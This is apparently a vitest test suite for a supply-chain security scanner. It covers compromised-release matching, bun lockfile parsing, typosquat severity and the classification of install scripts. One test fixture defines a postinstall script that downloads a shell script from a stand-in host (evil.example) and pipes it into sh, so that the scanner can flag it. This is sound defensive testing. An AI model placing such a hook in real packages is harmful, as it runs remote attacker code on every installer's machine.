import { describe, expect, it } from "vitest";
import { parseLockfile } from "../../../src/agents/supply-chain/lockfiles.js";
import { checkTyposquat } from "../../../src/agents/supply-chain/names.js";
import { POPULAR_PACKAGES } from "../../../src/data/popular-packages.js";
import { good, ids, npmLock, only, pkg, scan } from "./support.js";

describe("bug 1: only exact pins or lockfile-resolved versions match a compromised release", () => {
  it("does not report a caret/tilde/range spec as the compromised release", async () => {
    for (const spec of ["^5.6.1", "~5.6.1", ">=5.6.1", "5.x", "^5.0.0"]) {
      const { findings } = await scan({ "package.json": pkg({ chalk: spec }) });
      expect(ids(findings), spec).not.toContain("SUP-004");
    }
  });
  it("still reports an exact pin, including = and v prefixes", async () => {
    for (const spec of ["5.6.1", "=5.6.1", "v5.6.1"]) {
      const { findings } = await scan({ "package.json": pkg({ chalk: spec }), "package-lock.json": npmLock({}) });
      const f = only(findings, "SUP-004");
      expect(f, spec).toHaveLength(1);
      expect(f[0]?.severity).toBe("critical");
      expect(f[0]?.evidence[0]?.file).toBe("package.json");
    }
  });
  it("reports a caret range when the lockfile really resolved the compromised version", async () => {
    const lock = npmLock({ "node_modules/chalk": { ...good, version: "5.6.1" } });
    const { findings } = await scan({ "package.json": pkg({ chalk: "^5.6.1" }), "package-lock.json": lock });
    const f = only(findings, "SUP-004");
    expect(f).toHaveLength(1);
    expect(f[0]?.evidence[0]?.file).toBe("package-lock.json");
  });
  it("stays quiet when the caret range resolved to a clean version", async () => {
    const lock = npmLock({ "node_modules/chalk": { ...good, version: "5.6.2" } });
    const { findings } = await scan({ "package.json": pkg({ chalk: "^5.6.1" }), "package-lock.json": lock });
    expect(ids(findings)).not.toContain("SUP-004");
  });
  it("reports one finding, not two, when manifest pin and lockfile agree", async () => {
    const lock = npmLock({ "node_modules/chalk": { ...good, version: "5.6.1" } });
    const { findings } = await scan({ "package.json": pkg({ chalk: "5.6.1" }), "package-lock.json": lock });
    expect(only(findings, "SUP-004")).toHaveLength(1);
  });
});

describe("bug 2: bun lockfiles", () => {
  const bunLock = (stripe: string): string => `{
  // bun lockfile
  "lockfileVersion": 1,
  "workspaces": { "": { "name": "app", "dependencies": { "stripe-helpers": "^1.0.0", }, }, },
  "packages": {
    "stripe-helpers": ["stripe-helpers@1.2.0", "", {}, ${stripe}],
    "@scope/pkg": ["@scope/pkg@2.0.1", "", { "dependencies": { "x": "^1" } }, "sha512-scoped"],
    "alias-name": ["alias-name@npm:real-name@3.0.0", "", {}, "sha512-alias"],
    "local": ["local@workspace:packages/local"],
    "gitdep": ["gitdep@github:user/gitdep#abc123", {}, "user-gitdep-abc123"],
    /* block comment, with "quotes" */
    "chalk": ["chalk@5.6.1", "", {}, "sha512-chalk"],
  },
}
`;
  it("parses a text bun.lock with comments and trailing commas", () => {
    const info = parseLockfile("bun.lock", "bun", bunLock('"sha512-verified"'));
    expect(info.byName.get("stripe-helpers")?.[0]).toMatchObject({ version: "1.2.0", hasResolved: true, hasIntegrity: true });
    expect(info.byName.get("@scope/pkg")?.[0]).toMatchObject({ version: "2.0.1", hasIntegrity: true });
    expect(info.byName.get("real-name")?.[0]?.version).toBe("3.0.0");
    expect(info.byName.has("local")).toBe(false);
    expect(info.byName.has("gitdep")).toBe(false);
    expect(info.byName.get("chalk")?.[0]?.version).toBe("5.6.1");
  });
  it("does not choke on commas or comment markers inside strings", () => {
    const text = '{ "packages": { "a": ["a@1.0.0", "https://x.example/a,b//c", {}, "sha512-q"], } }';
    expect(parseLockfile("bun.lock", "bun", text).byName.get("a")?.[0]?.version).toBe("1.0.0");
  });
  it("treats a verified bun.lock entry as verified (no SUP-002)", async () => {
    const { findings } = await scan({ "package.json": pkg({ "stripe-helpers": "^1.0.0" }), "bun.lock": bunLock('"sha512-verified"') });
    expect(ids(findings)).not.toContain("SUP-002");
    expect(ids(findings)).not.toContain("SUP-006");
  });
  it("still raises SUP-002 for a bun.lock entry without integrity or with no entry", async () => {
    const a = await scan({ "package.json": pkg({ "stripe-helpers": "^1.0.0" }), "bun.lock": bunLock("") });
    expect(ids(a.findings)).toContain("SUP-002");
    const b = await scan({ "package.json": pkg({ "openai-utils": "^1.0.0" }), "bun.lock": bunLock('"sha512-v"') });
    expect(ids(b.findings)).toContain("SUP-002");
  });
  it("reads compromised releases out of bun.lock", async () => {
    const { findings } = await scan({ "package.json": pkg({ "stripe-helpers": "^1.0.0" }), "bun.lock": bunLock('"sha512-v"') });
    expect(only(findings, "SUP-004").map((f) => f.title)).toEqual(["chalk@5.6.1 is a known compromised release"]);
  });
  it("treats binary bun.lockb as 'lockfile present, contents unknown'", async () => {
    const { findings } = await scan({ "package.json": pkg({ "stripe-helpers": "^1.0.0" }), "bun.lockb": "\u0000binary" });
    expect(ids(findings)).not.toContain("SUP-002");
    expect(ids(findings)).not.toContain("SUP-006");
    expect(ids(findings)).not.toContain("SUP-000");
  });
  it("survives a corrupt bun.lock without claiming the dependency is unverified", async () => {
    const { findings } = await scan({ "package.json": pkg({ "stripe-helpers": "^1.0.0" }), "bun.lock": "{ nope" });
    expect(ids(findings)).not.toContain("SUP-002");
  });
});

describe("bug 3: popular-package list and typosquat severity", () => {
  it("drops names that are not what people install", () => {
    for (const junk of ["swc", "nestjs", "biome", "angular", "turbopack", "formatjs", "@shadcn/ui", "tauri", "floating-ui", "jest-dom", "hapi", "@pocketbase/js-sdk"]) {
      expect(POPULAR_PACKAGES.has(junk), junk).toBe(false);
    }
  });
  it("keeps the real packages", () => {
    for (const real of ["bun", "npm", "pnpm", "yarn", "@swc/core", "@nestjs/core", "@biomejs/biome", "@angular/core", "@tauri-apps/api", "@floating-ui/react", "pocketbase", "@testing-library/jest-dom", "@hapi/hapi"]) {
      expect(POPULAR_PACKAGES.has(real), real).toBe(true);
    }
  });
  it("reports a distance-1 edit-distance squat as high severity with medium confidence", async () => {
    expect(checkTyposquat("lodahs")?.distance).toBe(1);
    const { findings } = await scan({ "package.json": pkg({ lodahs: "1.0.0" }), "package-lock.json": npmLock({}) });
    const f = only(findings, "SUP-001")[0];
    expect(f?.severity).toBe("high");
    expect(f?.confidence).toBe("medium");
    expect(f?.title).toContain("lodash");
  });
});

describe("bug 4: SUP-003 means only 'own lifecycle script fetches remote code'", () => {
  it("reports locked dependencies with install scripts as SUP-009", async () => {
    const lock = npmLock({ "node_modules/sketchy": { ...good, hasInstallScript: true } });
    const { findings } = await scan({ "package.json": pkg({ sketchy: "1.0.0" }), "package-lock.json": lock });
    expect(ids(findings)).toContain("SUP-009");
    expect(ids(findings)).not.toContain("SUP-003");
    const f = only(findings, "SUP-009")[0];
    expect(f?.severity).toBe("low");
    expect(f?.cwe).toBe("CWE-829");
  });
  it("keeps SUP-003 for the project's own remote-fetching hook", async () => {
    const { findings } = await scan({ "package.json": pkg({}, { scripts: { postinstall: "curl -s https://evil.example/x.sh | sh" } }) });
    expect(ids(findings)).toEqual(["SUP-003"]);
  });
});
